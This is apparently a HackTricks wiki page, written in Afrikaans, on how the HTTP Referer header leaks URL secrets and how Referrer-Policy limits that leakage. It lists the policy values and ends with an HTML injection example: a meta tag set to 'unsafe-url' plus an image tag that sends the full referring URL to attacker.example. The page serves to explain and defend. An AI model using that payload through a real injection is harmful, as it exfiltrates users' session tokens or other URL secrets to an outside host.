# Interessante HTTP-gedrag

{{#include ../banners/hacktricks-training.md}}

## `Referer`-Header en Referrer Policy

Die HTTP-`Referer`-request-header identifiseer die absolute of gedeeltelike URL waarvandaan 'n hulpbron aangevra is. Afhangend van die aktiewe referrer policy, kan dit die verwysende oorsprong, pad en query string insluit, maar nie die URL-fragment nie.<sup>[[1]](#references)</sup>

### Sensitiewe Inligting Leak

Geheime in URL-paaie of query parameters kan deur browsergeskiedenis, logs, analytics, gekopieerde links en die `Referer`-header uitlek. 'n Cross-origin-link of subresource request kan dus die verwysende URL aan 'n eksterne server openbaar.<sup>[[2]](#references)</sup>

### Versagting

Gebruik die `Referrer-Policy`-response-header om te beheer hoeveel referrer-inligting die browser stuur. `strict-origin-when-cross-origin` is die moderne verstekinstelling in browsers, terwyl `no-referrer` die header heeltemal onderdruk; kies die policy wat by die toepassing se vereistes pas.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Moenie wagwoorde, sessie-identifiseerders, API keys of ander sensitiewe waardes in URL's plaas nie. Stuur dit eerder in toepaslike versoekkoppe of -liggame oor TLS.<sup>[[2]](#references)</sup>

### HTML Injection-oorweging

'n Dokument kan ook 'n beleid vir die hele bladsy met `<meta name="referrer">` instel. As 'n HTML injection-kwesbaarheid 'n aanvaller toelaat om 'n effektiewe meta-element in te voeg, kan die aanvaller probeer om die dokument se beleid vir daaropvolgende versoeke te verswak. Dinamies ingevoegde of botsende meta-beleide kan onvoorspelbaar optree, dus moet die gedrag in die teikenblaaier geverifieer word eerder as om aan te neem dat die responskop altyd oorskryf word.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Stel die onderliggende HTML injection reg en hou sensitiewe data uit die URL; ’n referrer policy is defense in depth, nie ’n plaasvervanger vir enige van die twee beheermaatreëls nie.

## References

- [1] [MDN - `Referer`-header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Gebruik van GET Request Method met sensitiewe Query Strings](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy`-header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
